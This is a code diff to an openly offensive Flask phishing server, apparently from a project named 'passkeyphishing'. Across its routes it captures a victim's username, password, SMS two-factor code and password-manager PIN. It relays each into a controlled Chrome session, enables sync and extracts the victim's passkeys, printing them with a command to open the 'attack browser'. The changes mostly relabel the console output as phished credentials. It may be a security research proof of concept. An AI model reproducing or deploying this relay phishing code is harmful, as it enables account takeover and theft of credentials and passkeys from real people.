@@ -4,6 +4,7 @@
 from flask import Flask, request, redirect, url_for, render_template
 
 from passkeyphishing.chrome import Chrome
+from passkeyphishing.colors import print_info, print_important, print_pwned
 
 # Flask constructor takes the name of
 # current module (__name__) as argument.
@@ -24,34 +25,34 @@ def index():
 
 
 @app.post('/password')
-def password():
-    print(request.form)
+def password_page():
     username = request.form.get('username')
     if username is None:
         return redirect(url_for('index'))
-    print(f"1. Got username {username}")
+    print_important(f"1. Phished username: {username}")
+    print_info("Entering username into Chrome...")
     chrome_browser.enter_text(username.encode())
     return render_template("password.html", username=username)
 
 @app.post('/verify')
 def verify():
-    print(request.form)
     username = request.form.get('username')
     password = request.form.get('password')
     if username is None or password is None:
         return redirect(url_for('index'))
-    print(f"2. Got password {password}")
+    print_important(f"2. Phished password: {password}")
+    print_info("Entering password into Chrome...")
     chrome_browser.enter_text(password.encode())
     return render_template("verify.html", username=username, password=password)
 
 
 @app.post('/sms')
 def sms():
-    print(request.form)
     username, password = request.form.get('username'), request.form.get('password')
     if username is None or password is None:
         return redirect(url_for(''))
-    print(f"3. Showing screen to select SMS 2FA {username}")
+    print_info(f"Selecting SMS code in Chrome...")
+    chrome_browser.select_sms_code()
     return render_template("sms.html", username=username, password=password)
 
 @app.post('/pmpin')
@@ -59,14 +60,14 @@ def pmpin():
     username, password, phone = request.form.get('username'), request.form.get('password'), request.form.get('phone')
 
     # Enter the pin
-    print(f"4. Entering SMS code ({phone}) for {username}")
+    print_important(f"3. Phished SMS code: ({phone})")
+    print_info(f"Entering SMS code into Chrome...")
     chrome_browser.enter_text(phone.encode())
     return render_template("password_manager_pin.html", username=username, password=password, phone=phone)
 
 
 @app.post('/pwned')
 def pwned():
-    print(request.form)
     password_manager_pin = "".join(request.form.getlist('pin[]'))
     username, password, phone = request.form.get('username'), request.form.get('password'), request.form.get('phone')
 
@@ -74,19 +75,24 @@ def pwned():
     if username is None or password is None:
         return redirect(url_for('index'))
 
+    print_important(f"4. Phished password manager PIN: ({password_manager_pin})")
+
     chrome_browser.agree_to_sync()
 
     # All should be good, get the keys
     passkeys = chrome_browser.get_passkeys()
 
-    print(f"******** PWNED *******")
-    print(f"\t{username}\t{password}\t{phone}")
-    print(f"\tPassword Manager PIN: {password_manager_pin}")
-    print("Passkeys:")
-    print(*passkeys, sep='\n')
-    print("\n"
-          f"\tcmd: google-chrome --user-data-dir={chrome_browser.tmp_dir}\n")
-    print("-"*50)
+    print_pwned(f"******** PWNED *******")
+    print_pwned(f"\tUsnermae: {username}\n"
+                f"\tPassword: {password}\n"
+                f"\tSMS Code: {phone}\n"
+                f"\tMngr PIN: {password_manager_pin}")
+    print_pwned("Passkeys:")
+    print_pwned(*passkeys, sep='\n')
+    print_pwned("\n"
+          f"\tCommand to launch attack browser: "
+                f"google-chrome --user-data-dir={chrome_browser.tmp_dir}\n")
+    print_pwned("-"*50)
     return render_template("pwned.html", username=username, password=password, phone=phone,
                            password_manager_pin=password_manager_pin,
                            passkeys=passkeys)
